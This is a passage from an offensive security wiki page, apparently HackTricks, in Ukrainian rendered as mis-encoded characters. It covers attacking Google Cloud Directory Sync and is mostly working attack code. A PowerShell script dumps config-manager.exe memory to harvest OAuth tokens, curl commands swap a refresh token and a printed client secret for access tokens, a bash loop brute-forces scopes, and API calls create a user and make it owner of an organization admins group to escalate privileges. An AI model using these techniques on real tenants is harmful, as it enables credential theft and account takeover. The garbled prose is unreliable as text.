–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, –ø–µ—Ä–µ–≥–ª—è–Ω—É–≤—à–∏ java-–∫–æ–¥ **`DirSync.jar`** –∑ **`C:\Program Files\Google Cloud Directory Sync`**, —à—É–∫–∞—é—á–∏ —Ä—è–¥–æ–∫ `exportkeys` (–æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –ø–∞—Ä–∞–º–µ—Ç—Ä cli, —è–∫–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª `upgrade-config.exe` –æ—á—ñ–∫—É—î –¥–ª—è –≤–∏–≤–µ–¥–µ–Ω–Ω—è –∫–ª—é—á—ñ–≤).
{% endhint %}

–ó–∞–º—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Å–∫—Ä–∏–ø—Ç–∞ PowerShell, —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`** –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º `-exportKeys` —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ **Key** —Ç–∞ **IV** –∑ —Ä–µ—î—Å—Ç—Ä—É –≤ —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–æ–º—É —Ñ–æ—Ä–º–∞—Ç—ñ, –∞ –ø–æ—Ç—ñ–º –ø—Ä–æ—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ CyberChef –∑ AES/CBC —Ç–∞ —Ü–∏–º –∫–ª—é—á–µ–º —ñ IV –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó.

### GCDS - –í–∏–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–æ–∫–µ–Ω—ñ–≤ –∑ –ø–∞–º'—è—Ç—ñ

–¢–∞–∫ —Å–∞–º–æ, —è–∫ —ñ –∑ GCPW, –º–æ–∂–ª–∏–≤–æ –≤–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –ø–∞–º'—è—Ç—å –ø—Ä–æ—Ü–µ—Å—É `config-manager.exe` (—Ü–µ –Ω–∞–∑–≤–∞ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É GCDS –∑ GUI), —ñ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ç–æ–∫–µ–Ω–∏ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞ –¥–æ—Å—Ç—É–ø—É (—è–∫—â–æ –≤–æ–Ω–∏ –≤–∂–µ –±—É–ª–∏ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω—ñ).\
–ì–∞–¥–∞—é, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ AD.

<details>

<summary>–í–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –ø—Ä–æ—Ü–µ—Å–∏ config-manager.exe —Ç–∞ —à—É–∫–∞—Ç–∏ —Ç–æ–∫–µ–Ω–∏</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - –ì–µ–Ω–µ—Ä–∞—Ü—ñ—è —Ç–æ–∫–µ–Ω—ñ–≤ –¥–æ—Å—Ç—É–ø—É –∑ —Ç–æ–∫–µ–Ω—ñ–≤ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è, –º–æ–∂–Ω–∞ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ —Ç–æ–∫–µ–Ω–∏ –¥–æ—Å—Ç—É–ø—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –π–æ–≥–æ —Ç–∞ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –∫–ª—ñ—î–Ω—Ç–∞ —ñ —Å–µ–∫—Ä–µ—Ç –∫–ª—ñ—î–Ω—Ç–∞, –∑–∞–∑–Ω–∞—á–µ–Ω—ñ –≤ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π –∫–æ–º–∞–Ω–¥—ñ:
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - Scopes

{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –Ω–∞–≤—ñ—Ç—å –º–∞—é—á–∏ refresh token, –Ω–µ–º–æ–∂–ª–∏–≤–æ –∑–∞–ø–∏—Ç–∞—Ç–∏ –∂–æ–¥–µ–Ω scope –¥–ª—è access token, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø–∏—Ç—É–≤–∞—Ç–∏ –ª–∏—à–µ **scopes, –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω—ñ –¥–æ–¥–∞—Ç–∫–æ–º, –≤ —è–∫–æ–º—É –≤–∏ –≥–µ–Ω–µ—Ä—É—î—Ç–µ access token**.

–¢–∞–∫–æ–∂ refresh token –Ω–µ —î –¥—ñ–π—Å–Ω–∏–º —É –∫–æ–∂–Ω–æ–º—É –¥–æ–¥–∞—Ç–∫—É.
{% endhint %}

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º GCSD –Ω–µ –º–∞—Ç–∏–º–µ –¥–æ—Å—Ç—É–ø—É —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –¥–æ –∫–æ–∂–Ω–æ–≥–æ –º–æ–∂–ª–∏–≤–æ–≥–æ OAuth scope, —Ç–æ–º—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç, –º–∏ –º–æ–∂–µ–º–æ –∑–Ω–∞–π—Ç–∏ scopes, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑ `refresh_token` –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó `access_token`:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

–Ü –æ—Å—å –≤–∏—Ö—ñ–¥, —è–∫–∏–π —è –æ—Ç—Ä–∏–º–∞–≤ –Ω–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–Ω—è:
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### –°—Ç–≤–æ—Ä—ñ—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –¥–æ–¥–∞–π—Ç–µ –π–æ–≥–æ –¥–æ –≥—Ä—É–ø–∏ `gcp-organization-admins`, —â–æ–± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –µ—Å–∫–∞–ª—É–≤–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –≤ GCP
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'
```
{% hint style="danger" %}
–ù–µ–º–æ–∂–ª–∏–≤–æ –Ω–∞–¥–∞—Ç–∏ –Ω–æ–≤–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É —Ä–æ–ª—å Super Admin, –æ—Å–∫—ñ–ª—å–∫–∏ **—Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –Ω–µ –º–∞—î –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –æ–±—Å—è–≥—ñ–≤** –¥–ª—è –Ω–∞–¥–∞–Ω–Ω—è –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.
{% endhint %}

## References

* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)
* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
